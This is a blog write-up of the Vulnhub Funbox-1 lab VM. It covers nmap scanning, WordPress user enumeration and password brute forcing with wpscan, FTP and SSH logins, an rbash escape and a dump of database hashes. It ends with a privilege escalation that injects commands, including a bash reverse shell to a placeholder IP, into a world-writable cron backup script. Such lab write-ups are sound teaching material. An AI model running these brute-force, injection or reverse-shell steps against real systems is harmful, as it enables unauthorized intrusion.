<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>crazyeights225</title>
   
    <link rel="stylesheet" href="../assets/bulma.min.css">
    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script><script src="../assets/js/navbar.js"></script><style>
      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
    </style>
  </head>
  <body>
    <div id="app" class="mt-2">
        <nav class="navbar container" role="navigation" aria-label="main navigation">
            <div class="navbar-brand">
              <a class="navbar-item" href="/">
                <img src="../assets/logo.png">
              </a>
              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbar">
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
              </a>
            </div>
            <div id="navbar" class="navbar-menu">
              <div class="navbar-start">
                <a href="../index.html" class="navbar-item">Posts</a>
                    <a href="../projects.html" class="navbar-item">Projects</a>
              </div>
            </div>
          </nav>
    </div>
    <div class="hero-body mt-2" style="background-color: #285aff;">
        <div class="container has-text-centered">
            <h1 class="title" style="color: #f1f1f1;">
                Vulnhub: Funbox-1
            </h1>
            <h2 class="subtitle" style="color: #f1f1f1;">
                Oct, 2020
            </h2>
        </div>
    </div>
</section>
<section class="container mt-2">
<div class="content column is-10">
    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
        <ul>
          <li><a href="../index.html">Posts</a></li>
          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
          <li class="is-active"><a href="#" aria-current="page">Funbox-1</a></li>
        </ul>
      </nav>
<h3>Scanning</h3>
<pre><code><span>crazyeights@es-base:~$ nmap -PS 192.168.56.1-255

Nmap scan report for 192.168.56.116
Host is up (0.00020s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

</span></code></pre>
<h5>More Focused Scanning</h5>
<pre><code><span>crazyeights@es-base:~$ nmap -A -p- 192.168.56.116
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 20:06 EDT
Nmap scan report for 192.168.56.116
Host is up (0.0014s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     ProFTPD
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://funbox.fritz.box/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message&quot;
|_    HY000
1 service unrecognized despite returning data.

[SNIP]
</span></code></pre>
<h3>Web:</h3>
<p>If you go to IP in your browser you are redirected to:
<code>http://funbox.fritz.box/</code></p>
<h6>Add funbox.fritz.box to your hosts file:</h6>
<p><code>crazyeights@es-base:~$ sudo vim /etc/hosts</code></p>
<pre><code><span>#CTF
192.168.56.116 funbox.fritz.box
</span></code></pre>
<h6>Refresh the page and you get a wordpress:</h6>
<img src="images/1.png" style="width:80%">
<h4>Using wpscan to enumerate users:</h4>
<pre><code><span>crazyeights@es-base:~$ wpscan --url http://funbox.fritz.box -e u

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://funbox.fritz.box/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] joe
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

</span></code></pre>
<h5>Cracking user passwords:</h5>
<pre><code><span>crazyeights@es-base:~$ wpscan --url http://funbox.fritz.box --passwords lists/rockyou-40.txt --usernames joe,admin

[!] Valid Combinations Found:
 | Username: joe, Password: 12345
 | Username: admin, Password: iubire

</span></code></pre>
<h4>Going to themes:</h4>
<p>Location of 404.php:
<code>http://funbox.fritz.box/wp-content/themes/twentyseventeen/404.php</code></p>
<ul>
<li>Tried to put a reverse shell in 404.php gives you an error</li>
</ul>
<h3>FTP:</h3>
<ul>
<li>Login as joe: <code>joe:12345</code></li>
</ul>
<pre><code><span>crazyeights@es-base:~$ ftp funbox.fritz.box
Connected to funbox.fritz.box.
220 ProFTPD Server (Debian) [::ffff:192.168.56.116]
Name (funbox.fritz.box:crazyeights): joe
331 Password required for joe
Password:
230 User joe logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-------   1 joe      joe           998 Jul 18 09:49 mbox
226 Transfer complete
ftp&gt; cd mbox
550 mbox: Not a directory
ftp&gt; get mbox
local: mbox remote: mbox
200 PORT command successful
150 Opening BINARY mode data connection for mbox (998 bytes)
226 Transfer complete
998 bytes received in 0.01 secs (66.7952 kB/s)
ftp&gt; 
</span></code></pre>
<p>The file mbox contains:</p>
<pre><code><span>From root@funbox  Fri Jun 19 13:12:38 2020
Return-Path: &lt;root@funbox&gt;
X-Original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 0)
	id 2D257446B0; Fri, 19 Jun 2020 13:12:38 +0000 (UTC)
Subject: Backups
To: &lt;joe@funbox&gt;
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: &lt;20200619131238.2D257446B0@funbox.fritz.box&gt;
Date: Fri, 19 Jun 2020 13:12:38 +0000 (UTC)
From: root &lt;root@funbox&gt;

Hi Joe, please tell funny the backupscript is done.

From root@funbox  Fri Jun 19 13:15:21 2020
Return-Path: &lt;root@funbox&gt;
X-Original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 0)
	id 8E2D4446B0; Fri, 19 Jun 2020 13:15:21 +0000 (UTC)
Subject: Backups
To: &lt;joe@funbox&gt;
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: &lt;20200619131521.8E2D4446B0@funbox.fritz.box&gt;
Date: Fri, 19 Jun 2020 13:15:21 +0000 (UTC)
From: root &lt;root@funbox&gt;

Joe, WTF!?!?!?!?!?! Change your password right now! 12345 is an recommendation to fire you.
</span></code></pre>
<p>-trying to log in as joe with password 12345</p>
<h4>SSH:</h4>
<p><code>crazyeights@es-base:~$ ssh joe@funbox.fritz.box </code></p>
<p>Joe is stuck in rbash:</p>
<pre><code><span>joe@funbox:~$ cd /var/www/html
-rbash: cd: restricted

</span></code></pre>
<h3>Breaking out of rbash:</h3>
<ul>
<li>That was easy. Calling bash interactively:</li>
</ul>
<pre><code><span>joe@funbox:~$ bash -i
joe@funbox:~$ cd /var/www/html
joe@funbox:/var/www/html$ 
</span></code></pre>
<h3>Snooping around:</h3>
<pre><code><span>joe@funbox:/var/www/html$ cd /home
joe@funbox:/home$ ls
funny  joe
joe@funbox:/home$ cd funny/
joe@funbox:/home/funny$ ls
html.tar
joe@funbox:/home/funny$ file html.tar
html.tar: POSIX tar archive (GNU)
joe@funbox:/home/funny$ tar -xvf html.tar
var/www/html/
tar: var: Cannot mkdir: Permission denied
tar: var/www/html: Cannot mkdir: No such file or directory
var/www/html/index.php
tar: var: Cannot mkdir: Permission denied
tar: var/www/html/index.php: Cannot open: No such file or directory
var/www/html/wp-cron.php
</span></code></pre>
<pre><code><span>joe@funbox:/home/funny$ sudo -l
[sudo] password for joe: 
Sorry, user joe may not run sudo on funbox.
</span></code></pre>
<pre><code><span>joe@funbox:/home/funny$ find / -perm /4000 2&gt;/dev/null
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/newgrp
[SNIP]
</span></code></pre>
<p><code>joe@funbox:/var/www/html$ mysql -u wordpress -p'wordpress'</code></p>
<p>funny is a admin/root user user:</p>
<pre><code><span>mysql&gt; select * from wp_users;
-+---------------------+-----------------------------------------------+-------------+-----
|  1 | admin      | $P$BGUPID16QexYI9XRblG9k8rnr0TMJN1 | admin         | funny@funbox.box |   

</span></code></pre>
<pre><code><span>joe@funbox:/var/www/html$ mail
&quot;/var/mail/joe&quot;: 2 messages 2 new
&gt;N   1 funny              Fri Jun 19 14:31  13/501   Reminder
 N   2 funny              Fri Jun 19 14:32  13/501   Reminder
? 
Return-Path: &lt;funny@funbox&gt;
X-Original-To: joe@funbox
Delivered-To: joe@funbox
Received: by funbox.fritz.box (Postfix, from userid 1000)
	id A7979446B3; Fri, 19 Jun 2020 14:31:26 +0000 (UTC)
Subject: Reminder
To: &lt;joe@funbox&gt;
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: &lt;20200619143126.A7979446B3@funbox.fritz.box&gt;
Date: Fri, 19 Jun 2020 14:31:26 +0000 (UTC)
From: funny &lt;funny@funbox&gt;

Hi Joe, the hidden backup.sh backups the entire webspace on and on. Ted, the new admin, test it in a long run.
</span></code></pre>
<h3>Finding the backup script</h3>
<pre><code><span>joe@funbox:/home/funny$ ls -lai
total 47608
533886 drwxr-xr-x 3 funny funny     4096 Jul 18 10:02 .
524290 drwxr-xr-x 4 root  root      4096 Jun 19 11:50 ..
536659 -rwxrwxrwx 1 funny funny       55 Jul 18 10:15 .backup.sh
[SNIP]
</span></code></pre>
<pre><code><span>joe@funbox:/home/funny$ cat .backup.sh 
#!/bin/bash
tar -cf /home/funny/html.tar /var/www/html
</span></code></pre>
<h4>Another file in the dir:</h4>
<pre><code><span>joe@funbox:/home/funny$ cat .reminder.sh 
#!/bin/bash
echo &quot;Hi Joe, the hidden backup.sh backups the entire webspace on and on. Ted, the new admin, test it in a long run.&quot; | mail -s&quot;Reminder&quot; joe@funbox
</span></code></pre>
<ul>
<li>The script is being run every minute</li>
<li>It took me a long time to realize this because the time is wrong.</li>
</ul>
<pre><code><span>joe@funbox:/home/funny$ stat html.tar 
  File: html.tar
  Size: 48701440  	Blocks: 95120      IO Block: 4096   regular file
Device: 802h/2050d	Inode: 533571      Links: 1
Access: (0664/-rw-rw-r--)  Uid: ( 1000/   funny)   Gid: ( 1000/   funny)
Access: 2020-10-09 00:34:45.831977679 +0000
Modify: 2020-10-09 00:58:01.619961040 +0000
Change: 2020-10-09 00:58:01.619961040 +0000
 Birth: -
joe@funbox:/home/funny$ date
Fri 09 Oct 2020 12:58:25 AM UTC
</span></code></pre>
<h3>Getting the root flag:</h3>
<h5>Because I am lazy:</h5>
<ul><li>Adding a line to copy the root flag to dir that joe can access into backup.sh</li>
<li>Since backup.sh is being run every minute by funny who has root privs, they can access the root dir, and the flag will be copied when the script is run next.</li>
<pre><code><span>#!/bin/bash
tar -cf /home/funny/html.tar /var/www/html
cp /root/flag.txt /home/flag.txt
</span></code></pre>
<ul>
<li>You are supposed to put a reverse shell in the backups script:</li>
</ul>
<pre><code><span>nc -lvp 1234
</span></code></pre>
<pre><code><span>/bin/bash -i &gt;&amp; /dev/tcp/AAA.BBB.CC.DD/1234 0&gt;&amp;1
</span></code></pre>
<h3>Retrieving the root flag:</h3>
<pre><code><span>joe@funbox:/home/funny$ cd /home
joe@funbox:/home$ ls
flag.txt  funny  joe
joe@funbox:/home$ cat flag.txt 
Great ! You did it...
FUNBOX - made by @0815R2d2
</span></code></pre>
<p>FIN.</p>
</div>
</section>
<footer class="footer">
    <div class="container">
        <div class="columns">
        </div>
    </div>
</footer>
</body>
</html>